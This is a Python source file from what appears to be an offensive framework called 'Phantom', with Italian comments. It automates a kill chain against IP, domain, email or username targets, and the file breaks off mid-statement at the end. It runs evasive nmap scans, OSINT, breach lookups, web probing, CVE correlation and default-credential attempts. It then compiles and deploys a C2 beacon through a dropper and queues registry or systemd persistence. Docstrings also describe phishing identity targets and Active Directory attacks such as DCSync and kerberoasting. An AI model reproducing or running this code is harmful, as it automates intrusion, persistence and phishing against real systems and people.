"""
automode.py — Phantom Auto Mode Orchestrator
Completa kill chain autonoma: enumeration → exploit → post-exploitation.
"""

import os
import re
import json
import time
import ipaddress
from datetime import datetime
from typing import Callable, Optional, List

from rich.console import Console
from phantom.core.session import session, KB_STATUS_DEFAULT
from phantom.core.executor import run_commands, run_command
from phantom.utils.notifier import notifier
from phantom.utils.network import get_lhost

console = Console()


# =============================================================================
# 1. TARGET CLASSIFICATION
# =============================================================================

def _classify_target(target: str) -> str:
    """Determina se il target è IP, dominio, email, username o URL."""
    if target.startswith(("http://", "https://")):
        return "url"
    try:
        ipaddress.ip_address(target)
        return "ip"
    except ValueError:
        pass
    if "@" in target:
        parts = target.split("@")
        if len(parts) == 2 and "." in parts[1]:
            return "email"
        return "username"
    if "_" in target or target.startswith("@"):
        return "username"
    if "." in target:
        return "domain"
    return "username"


# =============================================================================
# 2. AUTO EXECUTORS (phase executors for the sequence engine)
# =============================================================================

def _auto_classify() -> bool:
    """Classifica il target e inizializza KB."""
    target = session.target
    if not target:
        notifier.error("Nessun target impostato.")
        return False

    kb = session.knowledge_base
    kb["target"] = target
    kb["target_type"] = _classify_target(target)
    kb["started_at"] = datetime.now().isoformat()
    kb["status"]["classified"] = True

    notifier.info(f"Target classificato: {target} -> {kb['target_type'].upper()}")
    return True


_AUTO_SCAN_COMMANDS = {
    "ip": {
        "default": [
            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target}",
            "sudo nmap -sV -sC -p- -oX {xml} {target}",
        ],
        "stealth": [
            "sudo nmap -sS -f --mtu 24 -sV -p- -oX {xml} {target}",
            "sudo nmap -sS -D RND:5 {target}",
        ],
    },
    "domain": {
        "default": [
            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target}",
            "sudo nmap -sV -sC -p- -oX {xml} {target}",
        ],
        "stealth": [
            "sudo nmap -sS -f --mtu 24 -sV -p- -oX {xml} {target}",
        ],
    },
    "url": {
        "default": [
            "sudo nmap -sV -sC -p- --min-rate 3000 -T4 {target_host}",
        ],
        "stealth": [
            "sudo nmap -sS -f --mtu 24 -sV -p- {target_host}",
        ],
    },
}

def _auto_scan() -> bool:
    """Esegue scansione automatica basata sul tipo di target."""
    target = session.target
    kb = session.knowledge_base
    is_stealth = kb.get("stealth", True)

    from phantom.utils.paths import scan_xml_path, sessions_dir
    os.makedirs(sessions_dir(), exist_ok=True)
    xml_path = scan_xml_path(target)

    ttype = kb["target_type"]
    cmd_set = _AUTO_SCAN_COMMANDS.get(ttype, _AUTO_SCAN_COMMANDS["ip"])
    mode = "stealth" if is_stealth else "default"
    commands = cmd_set.get(mode, cmd_set["default"])

    # Formatta con target e xml path
    formatted = []
    for cmd in commands:
        host = target
        if ttype == "url":
            from urllib.parse import urlparse
            parsed = urlparse(target)
            host = parsed.hostname or target
        fmt_cmd = cmd.replace("{target}", target).replace("{xml}", xml_path).replace("{target_host}", host)
        formatted.append(fmt_cmd)

    notifier.info(f"Esecuzione di {len(formatted)} comandi di scan...")
    results = run_commands(formatted, target)
    kb["last_output"]["scan"] = results

    # Parsing risultati: estrae porte aperte
    services = []
    for output in results.values():
        matches = re.findall(r"(\d+)/(tcp|udp)\s+open\s+([\w\-\.]+)\s*(.*)", output)
        for port, proto, svc, ver in matches:
            if not any(s["port"] == int(port) for s in services):
                services.append({
                    "port": int(port),
                    "protocol": proto,
                    "service": svc,
                    "version": ver.strip(),
                })

    kb["services"] = services
    kb["status"]["scan_done"] = True
    session.add_result("scan", results)
    session.add_result("service_summary", services)
    notifier.info(f"Trovati {len(services)} servizi attivi")
    return True


def _auto_os_detect() -> bool:
    """Prova a determinare l'OS dalle risultanze di scansione."""
    target = session.target
    from phantom.utils.paths import scan_xml_path
    xml_path = scan_xml_path(target)

    if os.path.exists(xml_path):
        from phantom.utils.rce_deployer import parse_scan_xml
        _, os_info, _ = parse_scan_xml(target)
        if os_info:
            session.knowledge_base["os_info"] = os_info
            session.knowledge_base["status"]["os_detected"] = True
            notifier.info(f"OS rilevato: {os_info.get('name')} ({os_info.get('accuracy')}%)")
            return True

    # Fallback: nmap -O
    cmd = f"sudo nmap -O {target}"
    output = run_command(cmd, target)
    match = re.search(r"OS details: (.*)", output, re.IGNORECASE)
    if match:
        os_name = match.group(1).strip()
        session.knowledge_base["os_info"] = {"name": os_name, "accuracy": 90}
        session.knowledge_base["status"]["os_detected"] = True
        notifier.info(f"OS rilevato (fallback): {os_name}")
        return True

    session.knowledge_base["status"]["os_detected"] = True
    notifier.warn("OS non rilevabile automaticamente")
    return True


_AUTO_OSINT_COMMANDS = {
    "domain": [
        "whois {target}",
        "dig {target} ANY +short",
        "dig {target} MX +short",
        "dig {target} TXT +short",
    ],
    "ip": [
        "whois {target}",
    ],
}

def _auto_osint() -> bool:
    """Esecuzione OSINT automatica."""
    target = session.target
    kb = session.knowledge_base
    ttype = kb["target_type"]

    commands = []
    if ttype in _AUTO_OSINT_COMMANDS:
        commands = [c.replace("{target}", target) for c in _AUTO_OSINT_COMMANDS[ttype]]

    # API lookups: crt.sh per domini
    if ttype == "domain":
        from phantom.utils.api import crtsh_lookup
        subdomains = crtsh_lookup(target)
        if subdomains:
            kb["subdomains_found"] = subdomains
            notifier.info(f"crt.sh: {len(subdomains)} subdomini trovati")

    # Shodan / InternetDB per IP
    if ttype == "ip":
        from phantom.utils.api import shodan_lookup
        shodan_data = shodan_lookup(target)
        if shodan_data:
            ports = shodan_data.get("ports", [])
            if ports:
                notifier.info(f"Shodan: {len(ports)} porte aperte note")

    results = run_commands(commands, target) if commands else {}
    kb["last_output"]["osint"] = results
    existing = session.get_result("osint") or {}
    existing.update(results)
    session.add_result("osint", existing)
    kb["status"]["osint_done"] = True
    return True


def _auto_social_recon() -> bool:
    """Ricerca social per username."""
    from phantom.core.executor import run_command
    username = session.target.lstrip("@")
    notifier.status(f"Ricerca social per username: {username}...")
    cmd = f"sherlock {username} --timeout 5 --print-found"
    output = run_command(cmd, session.target)
    links = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', output)
    if links:
        kb = session.knowledge_base
        kb["social_profiles"] = links
        notifier.success(f"Trovati {len(links)} profili social")
    else:
        notifier.info("Nessun profilo social trovato")
    kb = session.knowledge_base
    kb["status"]["social_recon_done"] = True
    return True


def _auto_breach_check() -> bool:
    """Breach lookup per email/username (HIBP v3 con API key).

    Con PHANTOM_HIBP_API_KEY usa l'endpoint breachedaccount (reale, con i
    nomi dei breach e le date); senza chiave segnala chiaramente che la
    fonte non è configurata invece di produrre un falso negativo.
    """
    target = session.target
    kb = session.knowledge_base
    api_key = os.getenv("PHANTOM_HIBP_API_KEY", "")
    if not api_key:
        notifier.warn("Breach check saltato: PHANTOM_HIBP_API_KEY non configurato "
                      "(settabile in .env).")
        kb["status"]["breach_check_done"] = True
        return True
    try:
        import requests
        resp = requests.get(
            f"https://haveibeenpwned.com/api/v3/breachedaccount/{target}",
            headers={"hibp-api-key": api_key, "User-Agent": "Phantom"},
            params={"truncateResponse": "false"},
            timeout=10,
        )
        if resp.status_code == 200:
            for br in resp.json():
                kb["breaches_found"].append({
                    "email": target,
                    "breach": br.get("Name", "?"),
                    "date": br.get("BreachDate", ""),
                    "source": "hibp",
                })
            notifier.warn(f"Email compromessa in {len(kb['breaches_found'])} data breach!")
        elif resp.status_code == 404:
            notifier.info("Nessun breach trovato per il target.")
    except Exception as e:
        notifier.warn(f"Breach check fallito: {e}")
    kb["status"]["breach_check_done"] = True
    return True


_AUTO_WEB_COMMANDS = {
    "default": [
        "whatweb {url} --aggression 1",
        "wafw00f {url}",
    ],
    "deep": [
        "nuclei -u {url} -severity critical,high -silent",
        "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k -q 2>/dev/null",
    ],
}

def _target_url(target: str) -> str:
    """Normalize the web base URL without doubling the scheme."""
    if target.startswith(("http://", "https://")):
        return target
    return f"http://{target}"

def _auto_web_recon() -> bool:
    """Web reconnaissance automatica."""
    target = session.target
    kb = session.knowledge_base

    # Determina se ci sono servizi web
    services = kb.get("services", [])
    has_web = any(s["service"] in ("http", "https", "http-proxy") or s["port"] in ("80", "443", "8080", "8443") for s in services)
    if not has_web:
        notifier.info("Nessun servizio web rilevato, skip web recon")
        kb["status"]["web_recon_done"] = True
        return True

    commands = [c.replace("{url}", _target_url(target)) for c in _AUTO_WEB_COMMANDS["default"]]
    if kb.get("aggressive", False):
        commands += [c.replace("{url}", _target_url(target)) for c in _AUTO_WEB_COMMANDS["deep"]]

    results = run_commands(commands, target)
    kb["last_output"]["web"] = results
    existing = session.get_result("web") or {}
    existing.update(results)
    session.add_result("web", existing)
    kb["status"]["web_recon_done"] = True

    # Estrai endpoint web
    if kb.get("aggressive", False):
        endpoints = []
        for output in results.values():
            urls = re.findall(r'(?m)^\d{3}\s+.*?(http\S+)', output)
            endpoints.extend(urls)
        kb["web_endpoints"] = list(set(endpoints))

    return True


def _auto_cve_correlate() -> bool:
    """Correlazione CVE automatica dai servizi trovati."""
    from phantom.modules.exploit import ExploitModule, compute_exploitability_score
    from phantom.utils.api import nvd_lookup, exploitdb_lookup, github_poc_lookup
    from phantom.utils.parser import ServiceInfo

    kb = session.knowledge_base
    services = kb.get("services", [])
    if not services:
        notifier.warn("Nessun servizio da correlare")
        kb["status"]["cve_correlate_done"] = True
        return True

    ranked = []
    for svc in services:
        search_term = svc.get("product") or svc.get("service", "")
        version = svc.get("version", "")
        if not search_term or not version:
            continue

        try:
            cves = nvd_lookup(search_term, version)
        except Exception:
            cves = []

        for cve in cves:
            cve_id = cve.get("id", "")
            if not cve_id:
                continue
            has_exploit = exploitdb_lookup(cve_id)
            has_msf = bool(has_exploit)  # semplificato
            has_poc = github_poc_lookup(cve_id)
            score = compute_exploitability_score(cve, has_msf, has_poc)

            ranked.append({
                "service": {
                    "ip": session.target,
                    "port": svc.get("port", 0),
                    "protocol": svc.get("protocol", "tcp"),
                    "state": "open",
                    "service": svc.get("service", ""),
                    "product": svc.get("product", ""),
                    "version": version,
                },
                "cve": cve,
                "score": score,
                "has_msf": has_msf,
                "has_poc": has_poc,
            })

    ranked.sort(key=lambda x: x["score"], reverse=True)
    kb["cves"] = ranked[:20]
    session.add_result("exploit", {"ranked": ranked[:20]})
    kb["status"]["cve_correlate_done"] = True

    if ranked:
        notifier.success(f"CVE correlation: {len(ranked)} vulnerabilità trovate")
        for entry in ranked[:5]:
            c = entry["cve"]
            notifier.info(f"  {c.get('id')} — score {entry['score']}/100")
    else:
        notifier.info("Nessuna CVE trovata per i servizi correnti")

    return True


def _auto_test_creds() -> bool:
    """Test credenziali di default sui servizi trovati."""
    from phantom.utils.rce_deployer import detect_rce_vectors, auto_try_credentials, auto_select_vector

    kb = session.knowledge_base
    services = kb.get("services", [])
    os_info = kb.get("os_info", {})
    found_creds = kb.get("creds_found", [])

    if not services:
        kb["status"]["default_creds_tested"] = True
        return True

    vectors = detect_rce_vectors(services)
    if not vectors:
        kb["status"]["default_creds_tested"] = True
        return True

    # Prova credenziali su ogni vettore
    new_creds = []
    for vec in vectors:
        method = vec["method"]
        port = vec["port"]
        cred = auto_try_credentials(method, session.target, port, nmap_creds=found_creds)
        if cred:
            cred["method"] = method
            cred["port"] = port
            new_creds.append(cred)

    if new_creds:
        kb["creds_found"] = list(set(
            tuple(sorted(c.items())) for c in (found_creds + new_creds)
        ))
        kb["creds_found"] = [dict(t) for t in kb["creds_found"]]
        notifier.success(f"Trovate {len(new_creds)} credenziali valide")

    kb["status"]["default_creds_tested"] = True
    return True


def _auto_deploy_beacon() -> bool:
    """Deploy beacon automatico."""
    from phantom.utils.rce_deployer import auto_deploy_beacon as _auto_deploy

    kb = session.knowledge_base
    target = session.target
    aggressive = kb.get("aggressive", False)

    # Determina piattaforma dall'OS
    os_info = kb.get("os_info", {})
    os_name = os_info.get("name", "").lower() if os_info else ""
    if any(k in os_name for k in ("windows", "microsoft", "win")):
        platform = "windows"
    elif any(k in os_name for k in ("linux", "ubuntu", "debian", "centos")):
        platform = "linux"
    else:
        # Default dal tipo di servizi
        services = kb.get("services", [])
        svc_names = [s.get("service", "") for s in services]
        if any("msrpc" in s or "smb" in s or "netbios" in s for s in svc_names):
            platform = "windows"
        else:
            platform = "linux"

    # Prepara C2 (use_ssl coerente: il listener legacy resta HTTP di default;
    # il beacon riceve use_https anche via argv dai dropper POSIX)
    lhost = get_lhost()
    lport = session.lport or 443
    use_ssl = True  # secure-by-default (mTLS auto-generated)

    from phantom.utils.builder import compile_beacon, generate_dropper
    import phantom

    pkg_root = os.path.dirname(phantom.__file__)
    arch = "x64"

    notifier.status(f"Compilazione beacon per {platform}...")
    try:
        beacon_path = compile_beacon(platform, pkg_root, force_rebuild=True, arch=arch,
                                     host=lhost, port=lport, use_ssl=use_ssl)
        if not beacon_path:
            notifier.error("Compilazione beacon fallita")
            kb["status"]["rce_attempted"] = True
            return False
    except Exception as e:
        notifier.error(f"Compilazione beacon fallita: {e}")
        kb["status"]["rce_attempted"] = True
        return False

    dropper = generate_dropper(platform, lhost, lport, arch=arch, use_ssl=use_ssl)
    if not dropper:
        notifier.error("Generazione dropper fallita")
        kb["status"]["rce_attempted"] = True
        return False

    success = _auto_deploy(target, dropper, aggressive=aggressive)
    kb["beacon_deployed"] = success
    kb["status"]["rce_attempted"] = True

    if success:
        notifier.success("Beacon deployato con successo!")
    else:
        notifier.warn("Deploy beacon fallito su tutti i vettori")

    return success


def _auto_persistence() -> bool:
    """Imposta persistenza automatica se beacon attivo.

    The persistence is queued to the REMOTE beacon through the C2 task
    channel (the beacon's own `persist` built-in) — NEVER executed on the
    operator's machine (registry/cron edits here would be self-damage).
    """
    kb = session.knowledge_base
    if not kb.get("beacon_deployed", False):
        notifier.warn("Nessun beacon attivo, skip persistenza")
        kb["status"]["persistence_set"] = True
        return True

    from phantom.core.c2_server import c2_state
    os_info = kb.get("os_info", {})
    os_name = os_info.get("name", "").lower() if os_info else ""
    method = "runkey" if any(k in os_name for k in ("windows", "microsoft", "win")) else "systemd"

    queued = False
    for beacon_id, info in c2_state.get_beacons().items():
        if info.get("ip") != session.target:
            continue
        task_id = c2_state.queue_task(beacon_id, f"persist {method}")
        notifier.info(f"Persistenza ({method}) accodata al beacon {beacon_id} (Task: {task_id})")
        queued = True

    if not queued:
        notifier.warn("Nessun beacon registrato per il target: persistenza non accodata")
        kb["status"]["persistence_set"] = True
        return False

    kb["persistence_set"] = True
    kb["status"]["persistence_set"] = True
    notifier.success("Persistenza configurata sul beacon remoto")
    return True


# =============================================================================
# 3. SEQUENCE ENGINE (phase executors — decision logic lives in workflow.py)
# =============================================================================

_STEP_MAP = {
    "classify": _auto_classify,
    "scan": _auto_scan,
    "os_detect": _auto_os_detect,
    "osint": _auto_osint,
    "web_recon": _auto_web_recon,
    "social_recon": _auto_social_recon,
    "breach_check": _auto_breach_check,
    "cve_correlate": _auto_cve_correlate,
    "test_creds": _auto_test_creds,
    "deploy_beacon": _auto_deploy_beacon,
    "persistence": _auto_persistence,
}

# =============================================================================
# 4. REPORT
# =============================================================================

def _auto_generate_report():
    """Genera report finale dell'auto-mode."""
    from phantom.modules.report import ReportModule

    kb = session.knowledge_base
    session.add_note(f"AUTO-MODE EXECUTION SUMMARY")
    session.add_note(f"  Target: {kb.get('target')} ({kb.get('target_type')})")
    session.add_note(f"  Stealth: {kb.get('stealth')} | Aggressive: {kb.get('aggressive')}")
    session.add_note(f"  Started: {kb.get('started_at')}")
    session.add_note(f"  Status: {json.dumps(kb.get('status'), indent=2)}")

    if kb.get("services"):
        session.add_note(f"  Services found: {len(kb['services'])}")
    if kb.get("cves"):
        session.add_note(f"  CVEs correlated: {len(kb['cves'])}")
    if kb.get("beacon_deployed"):
        session.add_note(f"  Beacon deployed: YES")
    if kb.get("persistence_set"):
        session.add_note(f"  Persistence: SET")
    if kb.get("errors"):
        session.add_note(f"  Errors: {len(kb['errors'])}")

    name_base = re.sub(r"[^A-Za-z0-9_\-.]", "_", kb.get("target", "unknown"))
    name = f"auto_{name_base}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    session.save(name)

    # Report markdown professionale
    session.export_markdown(f"{name}.md")
    notifier.success(f"Report auto-mode salvato: {name}.md")
    return name# =============================================================================
# 5. SEQUENCE ENGINE (explicit scripted mode — merged workflow+automode)
# =============================================================================

def run_sequence_mode(target: str = "", stealth: bool = True,
                      aggressive: bool = False) -> None:
    """Deterministic kill-chain sequence (the merged workflow+automode
    engine) against ONE target.

    `auto` now delegates to the planner agent by default; use this explicit
    path when the operator wants the predictable, phase-ordered run with
    enterprise scoring (calibration / ATT&CK / threat intel / risk / history
    feedback recorded through WorkflowManager).
    """
    from phantom.core.workflow import workflow_manager
    if target:
        session.target = target
    if not session.target:
        notifier.error("Nessun target specificato.")
        return

    kb = session.knowledge_base
    kb["target"] = session.target
    kb["stealth"] = stealth
    kb["aggressive"] = aggressive
    kb["target_type"] = _classify_target(session.target)

    for phase_name, executor_fn in _STEP_MAP.items():
        workflow_manager.register_executor(phase_name, executor_fn)

    workflow_manager.run_workflow(session.target, stealth=stealth,
                                  aggressive=aggressive)
    report_name = _auto_generate_report()
    notifier.info(f"Report: {report_name}")


# =============================================================================
# 6. AGENT ROUTING (auto -> planner agent)
# =============================================================================

_MAX_CIDR_HOSTS = 256


def _expand_targets(raw_targets: List[str],
                    scope_list: Optional[List[str]] = None) -> List[str]:
    """Expand CIDR ranges and comma lists into a deduped target list,
    filtered by the engagement scope when provided."""
    from phantom.core.scope import is_in_scope
    out: List[str] = []
    seen = set()

    def _add(t: str) -> None:
        if not t or t in seen:
            return
        if scope_list:
            # identity targets (email/username/phone) are the engagement
            # SUBJECT and are always in scope — the scope list gates the
            # machines (ip/domain/url), not the person being assessed
            from phantom.automation.guidance.targets import (
                classify_target,
                is_identity_target,
            )
            ttype = classify_target(t)
            if not is_identity_target(ttype) and not is_in_scope(t, scope_list):
                notifier.warn(f"{t} fuori scope, ignorato")
                return
        seen.add(t)
        out.append(t)

    for raw in raw_targets:
        for token in raw.split(","):
            token = token.strip()
            if not token:
                continue
            if "/" in token:
                try:
                    net = ipaddress.ip_network(token, strict=False)
                except ValueError:
                    _add(token)  # e.g. a URL path, not a CIDR
                    continue
                hosts = list(net.hosts()) or [str(net.network_address)]
                if len(hosts) > _MAX_CIDR_HOSTS:
                    notifier.warn(
                        f"{token}: {len(hosts)} host, espansione limitata "
                        f"a {_MAX_CIDR_HOSTS}")
                    hosts = hosts[:_MAX_CIDR_HOSTS]
                for h in hosts:
                    _add(str(h))
            else:
                _add(token)
    return out


def _stream_agent_event(kind: str, data: dict, verbose: bool = False) -> None:
    tag = f"[bold blue]{data.get('target', '')}[/] " if data.get("target") else ""
    if kind == "run":
        notifier.info(f"{tag}{data.get('banner', data.get('capability'))} "
                      f"(cost {data.get('cost', '?')})")
    elif kind == "plan":
        steps = data.get("steps", [])
        notifier.info(f"{tag}plan: {' -> '.join(steps)} "
                      f"(strategy={data.get('strategy') or '-'})")
    elif kind == "inference":
        if verbose:
            for f in data.get("findings", []):
                notifier.info(f"{tag}[infer] {f.get('kind')}:{f.get('key')} "
                              f"→ {f.get('value')}")
    elif kind == "reason":
        if verbose:
            for h in data.get("hypotheses", []):
                notifier.info(f"{tag}[reason] {h.get('capability')} :: "
                              f"{h.get('reason')} (prio {h.get('priority')})")
    elif kind == "hypothesis":
        if verbose:
            for r in data.get("resolved", []):
                notifier.info(f"{tag}[hypothesis] {r.get('capability')} "
                              f"→ {r.get('status')}")
    elif kind == "found":
        values = data.get("values") or {}
        parts = []
        for fkey in (data.get("findings") or [])[:6]:
            v = values.get(fkey)
            if v:
                parts.append(f"{fkey} = {str(v)[:60]}")
            else:
                parts.append(fkey)
        notifier.success(f"{tag}{data.get('capability')}: {', '.join(parts)}")
    elif kind == "note":
        notifier.info(f"{tag}{data.get('capability')}: "
                      f"{data.get('detail', 'no new findings')}")
    elif kind == "blocked":
        notifier.warn(f"{tag}{data.get('capability')} bloccata: "
                      f"{data.get('reason', '')[:120]}")
    elif kind == "tool_missing":
        notifier.warn(f"{tag}{data.get('capability')}: tool mancanti "
                      f"{', '.join(data.get('tools', []))}")
    elif kind == "failed":
        notifier.error(f"{tag}{data.get('capability')}: "
                       f"{data.get('output', '')[:120]}")
    elif kind == "beacon_up":
        notifier.success(f"{tag}BEACON UP in C2 ({data.get('beacon_id', '')})")
    elif kind == "handoff":
        notifier.success(f"{tag}HANDOFF: beacon {data.get('beacon_id', '')} "
                         f"sotto controllo operatore — nessun cleanup automatico")
    elif kind == "halt":
        notifier.warn(f"{tag}halt: {data.get('reason', '')}")


def _make_agent_stream(verbose: bool = False,
                       on_event: Optional[Callable[[str, dict], None]] = None):
    """Factory for the shared agent event stream.

    The CLI renderer remains the default consumer. Electron and other local
    frontends can subscribe to the same events without duplicating the agent.
    """
    def _stream(kind: str, data: dict) -> None:
        if on_event is not None:
            try:
                on_event(kind, data)
            except Exception:
                # A frontend must never interrupt the engagement engine.
                pass
        _stream_agent_event(kind, data, verbose=verbose)
    return _stream


def _dry_run_plan(target: str, goal: str, profile: str,
                  aggressive: bool, paranoid: bool, speed: bool):
    """Build the agent's plan for a target WITHOUT executing anything."""
    from phantom.automation.belief import WorldModel
    from phantom.automation.guidance.targets import classify_target, is_identity_target
    from phantom.automation.guidance.commands import make_registry
    from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
    from phantom.automation.guidance.threatmodel import BlueTeamModel
    from phantom.automation.planner import Plan, Planner, GOAL_FACTS
    tt = classify_target(target)
    wm = WorldModel(target=target, target_type=tt)
    config = StealthConfig(aggressive=aggressive, paranoid=paranoid,
                           speed=speed, profile=profile)
    stealth = StealthEngine(wm, config, BlueTeamModel.for_profile(profile))
    planner = Planner(make_registry(), stealth)
    if goal == "deep":
        # deep mode: plan every ladder stage; each step is tagged with its
        # stage so the dry-run shows the full deliver -> post -> AD path
        from phantom.automation.agent import DEEP_STAGES
        deep_steps = []
        deep_facts = []
        for sg in DEEP_STAGES:
            sp = planner.plan_strategic(wm, goal=sg)
            for s in sp.steps:
                s.reason = f"[{sg}] {s.reason}"
            deep_steps.extend(sp.steps)
            deep_facts.extend(GOAL_FACTS.get(sg, []))
        plan = Plan(steps=deep_steps, goal="deep", complete=not deep_steps)
        goal_facts = deep_facts
    else:
        plan = planner.plan_strategic(wm, goal=goal)
        goal_facts = GOAL_FACTS.get(goal, [])
    chain = "identity" if is_identity_target(tt) else "network"
    return plan, tt, chain, goal_facts


def _threat_intel_feed():
    """Lazy global threat-intel feed (NVD/OTX/CISA KEV). Offline-safe: the
    feed returns exploited=False when the network is unreachable."""
    from phantom.core.threatintel import threat_intel
    return threat_intel


def _auto_workers(target, goal, profile, aggressive, paranoid, speed) -> int:
    """Auto-decide same-target workers (-a without a count): a quick
    dry-run plan tells us whether deepening is worthwhile.
      * exploit/web steps ahead  -> 2 (lead + exploit deepening)
      * identity/social target   -> 2 (lead + DEEPEN worker: while the lead
        waits for the human, the deepen worker keeps OSINT/breach/profile
        digging and polls the grabber, so the wait is never idle)
    Otherwise a single lead is enough (and faster to converge)."""
    try:
        p, _tt, _chain, _gf = _dry_run_plan(
            target, goal, profile, aggressive, paranoid, speed)
        ids = [s.capability.id for s in p.steps]
        if any(c in ids for c in ("service_exploit", "hunt_web",
                                  "rce_foothold", "env_probe")):
            return 2
        if _chain == "identity" and any(
                c in ids for c in ("osint_identity", "campaign_launch",
                                   "dm_launch", "profile_recon",
                                   "dossier_analyze", "phish_identity")):
            return 2
    except Exception:
        pass
    return 1


def _run_agent_single(target, goal, profile, aggressive, paranoid, speed,
                      scope_list, agents, verbose=False,
                      on_event: Optional[Callable[[str, dict], None]] = None,
                      llm: bool = False, state_path: str = ""):
    from phantom.automation.agent import run_autonomous
    workers = agents if agents > 0 else _auto_workers(
        target, goal, profile, aggressive, paranoid, speed)
    if workers > 1:
        notifier.info(
            f"Auto-decide: {workers} same-target workers "
            "(lead + exploit/deepen deepening).")
    return run_autonomous(
        target=target, profile=profile, aggressive=aggressive,
        paranoid=paranoid, speed=speed, goal=goal,
        on_event=_make_agent_stream(verbose, on_event), scope_list=scope_list,
        workers_per_target=workers, return_agent=True,
        state_path=state_path or None,
        threat_intel=_threat_intel_feed(), persist_learning=True, llm=llm)


def _run_agent_campaign(targets, goal, profile, aggressive, paranoid, speed,
                        scope_list, agents, verbose=False,
                        on_event: Optional[Callable[[str, dict], None]] = None,
                        llm: bool = False, state_dir: str = ""):
    from phantom.automation.agent import run_campaign
    n = len(targets)
    # -aN on a campaign is the concurrent fan-out pool; when N exceeds the
    # target count, the surplus becomes SAME-TARGET phase workers so the
    # requested agent count is never silently ignored (e.g. -a4 on 2 hosts
    # -> 2 concurrent sub-agents, each with lead + exploit worker).
    if agents > n:
        max_agents = n
        workers_per_target = max(1, agents // n)
        if workers_per_target > 1:
            notifier.info(
                f"Campaign: {max_agents} concurrent sub-agents x "
                f"{workers_per_target} same-target workers.")
    else:
        max_agents = agents if agents > 0 else min(n, 3)
        workers_per_target = 1
    return run_campaign(
        targets=targets, profile=profile, aggressive=aggressive,
        paranoid=paranoid, speed=speed, goal=goal,
        scope_list=scope_list, max_agents=max_agents,
        workers_per_target=workers_per_target,
        on_event=_make_agent_stream(verbose, on_event),
        state_dir=state_dir or None,
        threat_intel=_threat_intel_feed(), persist_learning=True, llm=llm)


def _handoff_c2(beacon_id: str) -> None:
    notifier.success("=" * 56)
    notifier.success("OPERATOR HANDOFF: la kill chain si ferma qui.")
    notifier.success("Il beacon passa sotto il tuo controllo nel "
                     "terminale C2: ispeziona e fai il cleanup a mano.")
    notifier.success("=" * 56)
    from phantom.core.c2_shell import run_c2
    run_c2(preferred_beacon=beacon_id or None)


def _report_out_dir() -> str:
    from phantom.utils.paths import sessions_dir
    return os.path.join(sessions_dir(), f"auto_{int(time.time())}")


def _safe_target_dir(target: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]", "_", target)


def _write_agent_reports(agent, profile: str, out_root: str, target: str):
    from datetime import datetime as _dt
    from phantom.automation.reporting import RawReport, ClientReport, ReportWriter
    raw = RawReport.from_agent(agent)
    raw.ended = _dt.now().isoformat(timespec="seconds")
    tdir = os.path.join(out_root, _safe_target_dir(target))
    return tdir, ReportWriter(tdir).write(
        raw, ClientReport.from_agent(agent, profile))


def _print_report_paths(paths: dict) -> None:
    for k, p in paths.items():
        console.print(f"  [cyan]{k}[/]: {p}")


def _fmt_elapsed(seconds: float) -> str:
    """Human-readable duration: "3m 12s", "45s", "1h 2m 3s"."""
    seconds = int(seconds)
    h, rem = divmod(seconds, 3600)
    m, s = divmod(rem, 60)
    if h:
        return f"{h}h {m}m {s}s"
    if m:
        return f"{m}m {s}s"
    return f"{s}s"


def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                  speed: bool = False, plan: bool = False, agents: int = 0,
                  goal: str = "deliver", profile: str = "enterprise",
                  verbose: bool = False,
                  on_event: Optional[Callable[[str, dict], None]] = None,
                  handoff_c2: bool = True,
                  llm: bool = False,
                  resume: str = "") -> None:
    """Autonomous kill chain (planner agent) — the `auto` entry point.

    Classifies each target (ip/domain/url/email/username/phone) and drives
    the full chain to beacon injection + persistence, then hands the beacon
    over to the operator in the C2 terminal. Identity targets converge
    through OSINT -> breach -> persona -> phish -> victim_ip first.

    goal="deep" does not stop at the beacon: it walks the ladder deliver ->
    post_exploit (SYSTEM/root + injection) -> ad (domain enum + kerberoast/
    AS-REP/DCSync) -> crack -> lateral, ending only when each stage has
    either succeeded or proven non-viable, and reports every stage outcome.

    Flags:
      stealth (paranoid)  max-OPSEC: slower cadence, skips loud tools
      aggressive          noisy + fast: online brute, loud tools, broad enum
      speed               opportunistic: exploit the first viable opening
      plan                dry-run: print the planned chain, execute nothing
      verbose             stream the live reasoning trace (inferences,
                          hypotheses formed, confirmations/refutations)      agents              N sub-agents (0 = auto-decide)
      resume <checkpoint> resume a run from an auto-mode checkpoint (also
                          inside an imported .pm bundle)

    Every run writes a checkpoint after each wave (data/sessions/auto_*/)
    so an interrupted engagement resumes with `--resume`, and the session
    can be handed to another operator with `export-session` (.pm).

    `stealth` and `aggressive` are mutually exclusive (validated by caller).
    """
    raw = list(targets or [])
    if isinstance(targets, str):
        raw = [targets]
    scope_list = list(session.scope) if session.scope else []
    resolved = _expand_targets(raw, scope_list=scope_list)
    if not resolved and session.target:
        resolved = _expand_targets([session.target], scope_list=scope_list)
    if not resolved:
        notifier.error("Nessun target specificato. Usa: auto <target> [target2, ...]")
        return

    notifier.success("=" * 25 + " PHANTOM AUTO-MODE (agent) " + "=" * 25)
    # auto-profile: a phone-number target (or any mobile-classified
    # target) defaults to the mobile defender model when the operator left
    # the default profile untouched — explicit --profile choices win.
    if profile == "enterprise":
        from phantom.automation.guidance.targets import classify_target
        if any(classify_target(t) in ("phone", "mobile") for t in resolved):
            profile = "mobile"
            notifier.info("Target mobile rilevato -> profilo difensivo: mobile")

    notifier.info(f"Target: {', '.join(resolved)}")
    notifier.info(f"Goal: {goal} | profile: {profile} | "
                  f"stealth={'paranoid' if stealth else 'on'} | "
                  f"aggressive={aggressive} | speed={speed} | "
                  f"verbose={verbose} | agents={agents or 'auto'} | "
                  f"llm={'on' if llm else 'off'}")

    if plan:
        for t in resolved:
            p, tt, chain, _goal_facts = _dry_run_plan(
                t, goal, profile, aggressive, stealth, speed)
            console.print(f"\n[bold cyan]{t}[/] ({tt}, {chain} chain)")
            if not p.steps:
                console.print("  [dim](goal già soddisfatto o nessun percorso)[/]")
            else:
                for i, s in enumerate(p.steps, 1):
                    console.print(
                        f"  {i}. [white]{s.capability.id}[/] "
                        f"[dim](cost {s.capability.opsec_cost}, "
